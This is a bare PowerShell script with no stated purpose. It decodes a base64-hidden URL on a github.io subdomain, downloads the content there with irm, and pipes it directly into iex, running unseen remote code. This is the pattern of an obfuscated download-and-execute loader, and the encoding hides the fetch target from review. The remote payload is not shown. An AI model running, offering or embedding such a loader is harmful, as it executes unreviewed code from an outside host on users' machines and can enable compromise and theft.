# PowerShell script

[string]$Base64String = "aHR0cHM6Ly9saTEzNDU4MjUxMzguZ2l0aHViLmlvL3MvZTU4MTFmYWUyNGJhYmMwYWU3MWMxZjlmOTRiNTRkNGY2NmM4ZmY4ODZmYmVlMjI5ZTBlODQ3ODQyMzA5NjkzNw=="

try {
    $bytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
    irm $decodedString | iex
}
catch {
    Write-Error "Failed Parse code"
}